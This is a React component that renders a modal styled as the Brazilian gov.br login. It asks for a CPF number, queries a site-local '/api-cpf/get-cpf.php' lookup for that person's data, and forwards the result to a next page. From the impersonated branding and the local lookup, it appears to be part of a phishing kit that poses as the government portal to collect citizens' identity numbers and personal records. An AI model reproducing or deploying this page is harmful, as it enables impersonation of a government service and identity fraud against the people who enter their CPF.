import { useEffect, useRef, useState } from "react";
import "./GovLoginModal.css";
import { X, FileText } from "lucide-react";

export default function GovLoginModal({ open, onClose, onContinue }) {

  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);

  const dialogRef = useRef(null);

  useEffect(() => {
    if (!open) return;

    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";

    return () => {
      document.body.style.overflow = prevOverflow;
    };
  }, [open]);

  if (!open) return null;

  const onOverlayClick = (e) => {
    if (e.target === e.currentTarget) onClose?.();
  };

  const onCpfChange = (e) => {
    const v = String(e.target.value || "")
      .replace(/\D/g, "")
      .slice(0, 11);

    setCpf(v);
  };



  /*
   CONSULTA API CPF
  */

  const handleContinue = async (e) => {

    e.preventDefault();

    if (cpf.length !== 11) {
      alert("CPF inválido");
      return;
    }

    setLoading(true);

    try {

      const res = await fetch(`/api-cpf/get-cpf.php?cpf=${cpf}`);

      const data = await res.json();


      if (data.error) {
        alert(data.error);
        setLoading(false);
        return;
      }


      /*
        ENVIA PARA PROXIMA PAGINA
      */

      onContinue?.({
        cpf: cpf,
        dados: data
      });


    } catch (err) {

      alert("Erro ao consultar CPF");

    }

    setLoading(false);

  };



  return (
    <div className="gov-modal-overlay" onMouseDown={onOverlayClick}>

      <div
        className="gov-modal"
        role="dialog"
        aria-modal="true"
        tabIndex={-1}
        ref={dialogRef}
      >

        <button
          className="gov-modal-close"
          onClick={onClose}
        >
          <X size={18} />
        </button>



        <div className="gov-modal-header">
          <img
            className="gov-modal-logo"
            src="/logo2.png"
          />
        </div>



        <div className="gov-modal-title">
          Identifique-se no gov.br com:
        </div>



        <div className="gov-modal-option">

          <div className="gov-modal-option-icon">
            <FileText size={18} />
          </div>

          <div>

            <div className="gov-modal-option-name">
              Número do CPF
            </div>

            <div className="gov-modal-option-desc">
              Digite seu CPF para criar ou acessar sua conta gov.br
            </div>

          </div>

        </div>



        <form
          className="gov-modal-form"
          onSubmit={handleContinue}
        >

          <label className="gov-modal-label">
            CPF
          </label>

          <input
            className="gov-modal-input"
            placeholder="Digite seu CPF"
            value={cpf}
            onChange={onCpfChange}
          />



          <button
            className="gov-modal-continue"
            disabled={loading}
          >

            {loading ? "Consultando..." : "Continuar"}

          </button>

        </form>

      </div>

    </div>
  );

}